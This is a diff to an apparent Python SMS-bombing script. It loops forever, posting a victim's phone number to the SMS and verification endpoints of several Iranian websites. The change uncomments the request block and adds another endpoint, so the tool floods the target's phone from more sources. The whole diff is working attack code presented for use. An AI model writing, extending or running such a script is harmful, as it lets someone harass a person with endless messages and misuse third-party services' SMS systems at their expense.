@@ -9,7 +9,7 @@ else:
     phone2 = '+98' + phone[1:]
     try:
         while True:
-            '''try:
+            try:
                 hamyarzaban_data = {'phone':phone}
                 hamyarzaban = requests.post("https://hamyarzaban.com/wp-content/themes/hamyarzaban/sms.php")
                 print(f"ham status: {hamyarzaban}")
@@ -88,16 +88,15 @@ else:
                 print("trob not")
             try:
                 bama_data = {'cellNumber':phone}
-                bama = requests.post('https://bama.ir/signin-checkforcellnumber', json=bama_data)
-                print(f'bama status {bama}')
-            except:
-                print("bama not")'''
-            try:
-                bama_data = {'cellNumber':phone}
                 bama = requests.post('https://bama.ir/signin-checkforcellnumber', data=bama_data)
                 print(f'bama status {bama}')
             except:
                 print("bama not")
-            
+            try:
+                hamrahcard_data = {'action':'getAppViaSMS','number':phone}
+                hamrahcard = requests.post('https://hamrahcard.ir/wp-admin/admin-ajax.php', data=hamrahcard_data)
+                print(f'hamrahcard status {hamrahcard}')
+            except:
+                print("hamrahcard not")
     except:
         pass
